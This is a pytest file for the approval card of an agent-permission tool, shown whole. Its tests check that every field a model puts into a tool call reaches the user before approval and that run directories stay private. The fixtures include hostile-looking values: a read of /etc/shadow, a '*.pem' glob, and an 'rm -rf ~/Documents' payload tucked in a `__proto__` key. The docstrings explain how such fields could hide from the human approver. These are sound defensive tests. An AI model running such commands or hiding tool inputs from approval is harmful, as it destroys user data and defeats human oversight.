    shown = (summary["sub"] or "") + "\n" + (summary["body"] or "")
    assert buried in shown, f"{tool}.{field} was truncated before the payload"
    assert "…" not in shown, "an ellipsis means something was hidden"


@pytest.mark.parametrize("tool,tool_input", [
    # `a || b` renders one side and used to mark BOTH covered, so the loser was
    # skipped by the leftover dump too — invisible on the card, authorised by
    # updatedInput all the same. Which side wins does not matter; that every
    # value reaches the card one way or the other does.
    ("Read", {"file_path": "/shown.txt", "path": "/etc/shadow"}),
    ("WebFetch", {"url": "https://shown.test", "query": "exfiltrate", "prompt": "p"}),
    ("WebSearch", {"query": "shown", "url": "https://hidden.test"}),
    ("Grep", {"pattern": "p", "path": "/a", "glob": "*.pem"}),
])
def test_both_sides_of_an_alternation_reach_the_card(tool, tool_input):
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    summary = _summarize(tool, tool_input)
    shown = (summary["sub"] or "") + "\n" + (summary["body"] or "")
    for key, value in tool_input.items():
        rendered = value in shown
        left_over = key not in summary["covered"]  # buildPermCard prints these
        assert rendered or left_over, (
            f"{tool}.{key}={value!r} is claimed as covered but never rendered — "
            "it would vanish from the card while updatedInput still authorises it")


def _leftover(raw_input_json, covered):
    """Run the card's real `leftoverInput` over one tool input.

    The input is handed over as a JSON *string* parsed inside node rather than
    as a JS literal, because the bug this guards against only exists for keys
    the JSON parser DEFINES — a literal would go through assignment and hide it.
    """
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    start = html.index("function leftoverInput(")
    fn = html[start:html.index("function buildPermCard(", start)]
    script = fn + "\nconsole.log(JSON.stringify(leftoverInput(JSON.parse(%s), %s)));" % (
        json.dumps(raw_input_json), json.dumps(covered))
    out = subprocess.run(["node", "-e", script], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


_EVERY_SURFACE = [
    # An empty value is the case that motivated this: buildPermCard emits a
    # <pre> only for a truthy body, so a key claimed as "covered" while
    # rendering as nothing appeared on NEITHER surface.
    ("Write", {"file_path": "/notes.md", "content": ""}),
    ("Bash", {"command": "", "description": "tidy up"}),
    ("Grep", {"pattern": "", "path": "/home"}),
    ("Glob", {"pattern": "", "path": "/home"}),
    ("Edit", {"file_path": "/a", "old_string": "x", "new_string": ""}),
    ("NotebookEdit", {"notebook_path": "/n.ipynb", "new_source": ""}),
    ("WebFetch", {"url": "", "prompt": ""}),
    # …and the ordinary non-empty cases must keep working.
    ("Write", {"file_path": "/a", "content": "real"}),
    ("Bash", {"command": "ls", "description": "d", "timeout": 900}),
    ("Read", {"file_path": "/shown.txt", "path": "/etc/shadow"}),
    ("mcp__x__y", {"secret_arg": "visible", "empty_arg": ""}),
]


@pytest.mark.parametrize("tool,tool_input", _EVERY_SURFACE,
                         ids=["%s-%s" % (t, "-".join(i)) for t, i in _EVERY_SURFACE])
def test_every_input_value_reaches_one_surface_or_the_other(tool, tool_input):
    """The whole disclosure contract in one assertion.

    Allow hands the tool its input verbatim, so every key must be visible
    somewhere: rendered by the curated summary, or printed by the leftover
    dump. `covered` is what routes between the two, and each way it has been
    wrong has produced the same bug — hand-listed (the `a || b` loser),
    then claimed-for-empty (a `Write` whose empty `content` truncates the file
    while the card shows a bare path).

    Note the `bool(text)` guard: `"" in shown` is always True, which is exactly
    why the earlier alternation test could not catch the empty case.
    """
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    summary = _summarize(tool, tool_input)
    shown = (summary["sub"] or "") + "\n" + (summary["body"] or "")
    leftover = _leftover(json.dumps(tool_input), summary["covered"]) or {}
    for key, value in tool_input.items():
        text = value if isinstance(value, str) else json.dumps(value)
        # An empty value carries no text to look for, so the only way to
        # disclose it is to NAME it — either in the leftover dump or in the
        # verbatim JSON the unknown-tool branch renders as its body.
        disclosed = (key in leftover
                     or '"%s"' % key in shown
                     or (bool(text) and text in shown))
        assert disclosed, (
            f"{tool}.{key}={value!r} appears on neither surface — the user "
            "would approve it without ever seeing it, and permission_server "
            "returns updatedInput unchanged")


def test_an_empty_write_is_not_shown_as_a_bare_path():
    """The sharp end of the rule above.

    `Write` with `content: ""` truncates the file. Marking `content` covered
    while rendering nothing made that card identical to an ordinary path-only
    approve — no body, no leftover dump, nothing to distinguish "write this
    text" from "empty this file".
    """
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    summary = _summarize("Write", {"file_path": "/notes.md", "content": ""})
    assert "content" not in summary["covered"], (
        "an unrendered key must not be claimed as covered")
    assert _leftover(json.dumps({"file_path": "/notes.md", "content": ""}),
                     summary["covered"]) == {"content": ""}


def test_no_input_key_is_dropped_from_the_card():
    """Allow authorises the whole input, so a key the curated summary has no
    case for must still be visible rather than assumed unimportant."""
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    # `covered` is the contract buildPermCard uses to render the leftovers.
    summary = _summarize("Bash", {"command": "ls", "description": "d",
                                  "run_in_background": True, "timeout": 900})
    assert set(summary["covered"]) == {"command", "description"}
    extra = _leftover(json.dumps({"command": "ls", "description": "d",
                                  "run_in_background": True, "timeout": 900}),
                      summary["covered"])
    assert extra == {"run_in_background": True, "timeout": 900}


def test_a_proto_key_is_not_swallowed_by_the_prototype_setter():
    """A model-authored input may carry an own `__proto__` key.

    It reaches the page through res.json(), which — like JSON.parse — defines
    that key as an ordinary own property, so Object.keys lists it and the
    leftover dump is on the hook for showing it. Building the dump by
    ASSIGNING it into `{}` instead hits Object.prototype's legacy `__proto__`
    setter: no own property is created, the field renders as `{}`, and the
    user approves a payload the card told them was empty — permission_server
    returns updatedInput unchanged, so the field is authorised regardless.
    """
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    raw = '{"command": "ls", "__proto__": {"evil": "rm -rf ~/Documents"}}'
    extra = _leftover(raw, ["command"])
    assert extra is not None, "the __proto__ field vanished from the card entirely"
    assert extra.get("__proto__") == {"evil": "rm -rf ~/Documents"}, (
        "the card would render an empty object while updatedInput still "
        f"authorises the field; got {extra!r}")


@pytest.mark.parametrize("raw,covered,expected", [
    # `__proto__` is the only name the setter actually swallows, and it does so
    # for an object AND for a primitive — the latter is the quieter half, since
    # the setter simply ignores it without even changing a prototype. Both of
    # these render as `{}` before the fix.
    ('{"__proto__": "a string"}', [], {"__proto__": "a string"}),
    ('{"__proto__": {"o": 1}, "k": 2}', ["k"], {"__proto__": {"o": 1}}),
    # Controls. These pass under the assignment form too — kept so the fix is
    # pinned to preserving ordinary behaviour rather than only to the bug:
    # other Object.prototype names are plain data properties that shadow fine…
    ('{"toString": "shadowed", "b": 2}', ["b"], {"toString": "shadowed"}),
    ('{"constructor": {"x": 1}}', [], {"constructor": {"x": 1}}),
    # …and a fully covered input must still yield no second <pre>.
    ('{"a": 1}', ["a"], None),
    ('{}', [], None),
])
def test_the_leftover_dump_survives_prototype_named_keys(raw, covered, expected):
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    assert _leftover(raw, covered) == expected


def test_grep_still_shows_its_scope_alongside_the_pattern():
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    summary = _summarize("Grep", {"pattern": "TODO", "path": "/src", "glob": "*.py"})
    assert "TODO" in summary["body"]
    assert "/src" in summary["sub"] and "*.py" in summary["sub"]


@pytest.mark.skipif(os.name == "nt", reason="POSIX mode bits")
def test_the_run_tree_is_not_readable_by_other_local_accounts(agent, tmp_path,
                                                              monkeypatch):
    """A run dir is the whole conversation — out.jsonl is the transcript,
    meta.json the user's message, perm/*.req.json every tool payload — and it
    lives under a temp root that is world-readable on a typical Linux box.
    Default modes (0755/0644) handed all of it to any other local account.
    macOS' per-user temp root hides the problem there; it is not a fix.
    """
    monkeypatch.setattr(os, "umask", lambda _mask: 0o022)  # a permissive umask
    target = tmp_path / "sample.html"
    target.write_text("<html></html>")
    monkeypatch.setattr(agent, "RUNS", str(tmp_path / "runs"))
    monkeypatch.setattr(agent, "_claude_bin", lambda: "/bin/claude")

    class _Proc:
        pid = 4242

    monkeypatch.setattr(agent.subprocess, "Popen", lambda cmd, **kw: _Proc())
    run_id = agent._start(str(target), "hi", "", "", "")["run_id"]
    run_dir = os.path.join(agent.RUNS, run_id)

    for d in (run_dir, agent._perm_dir(run_dir)):
        mode = stat.S_IMODE(os.stat(d).st_mode)
        assert mode == 0o700, f"{d} is {oct(mode)}, readable beyond this user"
    for name in ("meta.json", "out.jsonl", "err.log", "pid", "mcp.json"):
        path = os.path.join(run_dir, name)
        mode = stat.S_IMODE(os.stat(path).st_mode)
        assert mode == 0o600, f"{name} is {oct(mode)}"


@pytest.mark.skipif(not hasattr(os, "geteuid"), reason="POSIX uid")
def test_the_runs_root_is_per_user(agent):
    """One shared `fused_render_claude` cannot be both private and usable: at
    0700 the first account to open a chat owns the namespace and everyone else
    is locked out of creating runs at all, and anything writable by them is
    either a world-writable dir we created or the disclosure the 0700 exists
    to prevent. A root per uid removes the contention instead of trading one
    problem for the other."""
    assert str(os.geteuid()) in agent.RUNS
    assert agent.RUNS.startswith(tempfile.gettempdir())
    # ...and it is still one tree, not a per-run scatter
    assert agent.RUNS.endswith(os.path.join("runs"))


def test_a_shared_parent_won_by_another_run_is_not_an_error(agent, tmp_path,
                                                            monkeypatch):
    """Deterministic form of the first-run race.

    `fused_render_claude` and `runs` are shared by every run, so two templates
    starting their first run at once both see them missing and both mkdir. The
    loser used to propagate FileExistsError out of `_start`, so one chat simply
    never sent its message. Here the parents already exist while `_private_dir`
    is told they do not — exactly the window between its check and its mkdir.
    """
    runs = tmp_path / "fused_render_claude" / "runs"
    os.makedirs(runs)  # what the other process finished a moment ago
    real_isdir = os.path.isdir
    window = {str(runs), str(runs.parent)}

    def racing_isdir(p):
        # Lie once per path — that is the window: the check says "missing",
        # the other process wins the mkdir, and by the time we verify what
        # blocked us the directory is really there.
        if str(p) in window:
            window.discard(str(p))
            return False
        return real_isdir(p)

    monkeypatch.setattr(agent.os.path, "isdir", racing_isdir)

    run_dir = str(runs / "20260101-000000-abcdef")
    agent._private_dir(run_dir)  # must not raise
    assert os.path.isdir(run_dir)
    if os.name != "nt":
        assert stat.S_IMODE(os.stat(run_dir).st_mode) == 0o700


def test_concurrent_first_runs_all_get_a_directory(agent, tmp_path):
    """The real thing: N first-runs against a parent chain that does not exist
    yet. Every one of them has to come away with its own run dir."""
    runs = tmp_path / "fused_render_claude" / "runs"
    assert not runs.exists()
    start = threading.Barrier(8)
    failures, made = [], []

    def first_run(n):
        try:
            start.wait(timeout=10)
            path = str(runs / f"20260101-000000-{n:06d}")
            agent._private_dir(path)
            made.append(path)
        except Exception as exc:  # noqa: BLE001 — the point is to see any of them
            failures.append(exc)

    threads = [threading.Thread(target=first_run, args=(n,)) for n in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)

    assert not failures, f"a concurrent first run aborted: {failures}"
    assert len(made) == 8 and all(os.path.isdir(p) for p in made)


def test_the_run_dir_itself_is_still_an_exclusive_create(agent, tmp_path):
    """Tolerating a shared parent must not extend to the leaf: that one is
    this run's private 0700 boundary, so an existing one is a collision or
    somebody else's directory, not something to adopt."""
    run_dir = tmp_path / "fused_render_claude" / "runs" / "20260101-000000-abcdef"
    os.makedirs(run_dir)
    with pytest.raises(FileExistsError):
        agent._private_dir(str(run_dir))


@pytest.mark.skipif(os.name == "nt", reason="POSIX uids")
def test_a_parent_owned_by_someone_else_is_refused(agent, tmp_path, monkeypatch):
    """Our path under the temp root is predictable — `fused_render_claude-<uid>`
    names the victim — so another account can pre-create it. Adopting theirs
    hands them the parent of every run dir, and the sticky bit that protects
    our entries in /tmp is not inherited by a directory they made: they can
    rename the 0700 leaf aside right after mkdir and leave a world-readable
    one, and the transcript lands in it.
    """
    planted = tmp_path / "fused_render_claude-1000" / "runs"
    os.makedirs(planted)
    monkeypatch.setattr(agent, "RUNS", str(planted))
    real_lstat = os.lstat
    other = os.geteuid() + 1

    def lying_lstat(p):
        st = real_lstat(p)
        if str(p) == str(planted):  # as if another account had made it
            return os.stat_result((st.st_mode, st.st_ino, st.st_dev, st.st_nlink,
                                   other, st.st_gid, st.st_size,
                                   st.st_atime, st.st_mtime, st.st_ctime))
        return st

    monkeypatch.setattr(agent.os, "lstat", lying_lstat)
    with pytest.raises(PermissionError, match="another account"):
        agent._private_dir(str(planted / "20260101-000000-abcdef"))


@pytest.mark.skipif(os.name == "nt", reason="POSIX mode bits")
def test_a_world_writable_parent_is_refused(agent, tmp_path, monkeypatch):
    """Ours by uid but writable by everyone is the same hole: anyone can still
    swap the run dir out from under us."""
    planted = tmp_path / "fused_render_claude-x" / "runs"
    os.makedirs(planted)
    os.chmod(planted, 0o777)
    monkeypatch.setattr(agent, "RUNS", str(planted))
    with pytest.raises(PermissionError, match="writable by others"):
        agent._private_dir(str(planted / "20260101-000000-abcdef"))


@pytest.mark.skipif(os.name == "nt", reason="POSIX symlinks")
def test_a_symlinked_parent_is_refused(agent, tmp_path, monkeypatch):
    """lstat, not stat: a symlink is not a directory we own, however good its
    target looks — following it would put the transcript wherever it points."""
    elsewhere = tmp_path / "attacker"
    os.makedirs(elsewhere, mode=0o700)
    root = tmp_path / "fused_render_claude-x"
    os.makedirs(root, mode=0o700)
    os.symlink(elsewhere, root / "runs")
    monkeypatch.setattr(agent, "RUNS", str(root / "runs"))
    with pytest.raises(NotADirectoryError):
        agent._private_dir(str(root / "runs" / "20260101-000000-abcdef"))


def test_our_own_parents_are_accepted(agent, tmp_path, monkeypatch):
    """The check must not reject the ordinary case it exists to protect."""
    runs = tmp_path / "fused_render_claude-x" / "runs"
    os.makedirs(runs, mode=0o700)
    monkeypatch.setattr(agent, "RUNS", str(runs))
    run_dir = str(runs / "20260101-000000-abcdef")
    agent._private_dir(run_dir)
    assert os.path.isdir(run_dir)


def test_a_file_blocking_a_parent_still_raises(agent, tmp_path):
    """FileExistsError is swallowed only when what won the race is a directory
    — a plain file in the path is not a lost race, and no retry fixes it."""
    (tmp_path / "fused_render_claude").write_text("not a directory")
    with pytest.raises((FileExistsError, NotADirectoryError)):
        agent._private_dir(str(tmp_path / "fused_render_claude" / "runs" / "r1"))


@pytest.mark.skipif(os.name == "nt", reason="POSIX mode bits")
def test_a_parked_request_file_is_private(tmp_path, server):
    """The request body is the tool payload itself, so it must land 0600 — set
    by the create, never a chmod after the content is already on disk."""
    perm_dir = tmp_path / "perm"
    pending = server.send_async("tools/call", {
        "name": "approve",
        "arguments": {"tool_name": "Bash", "input": {"command": "echo secret"}}})
    req = _wait_for_request(perm_dir)
    mode = stat.S_IMODE(os.stat(perm_dir / (req["id"] + ".req.json")).st_mode)
    assert mode == 0o600, f"request file is {oct(mode)}"
    assert stat.S_IMODE(os.stat(perm_dir).st_mode) == 0o700

    # Answer it and collect the reader before leaving: an abandoned request
    # means teardown closes the server under a thread still blocked on
    # readline, and the EOF surfaces as PytestUnhandledThreadExceptionWarning.
    (perm_dir / (req["id"] + ".res.json")).write_text(json.dumps({"decision": "deny"}))
    assert _result_payload(pending.result(10))["behavior"] == "deny"


def test_template_wires_the_decide_action(agent):
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    assert 'action: "decide"' in html
    assert "syncPermissions(data.permissions" in html
    # A tool input is model-authored text; rendering it as markup would be an
    # injection straight into the approval prompt the user is reading.
    assert ".innerHTML" not in html.split("function buildPermCard")[1] \
        .split("function syncPermissions")[0]


def monkey_runs(agent, tmp_path):
    """Point the module's RUNS at tmp_path, where `_run_dir` made "run"."""
    agent.RUNS = str(tmp_path)


def monkeypatch_alive(agent):
    """Treat the run as in flight — these fixtures write no pid file, and a
    decision on a finished run is deliberately recorded as expired."""
    agent._alive = lambda _run_dir: True
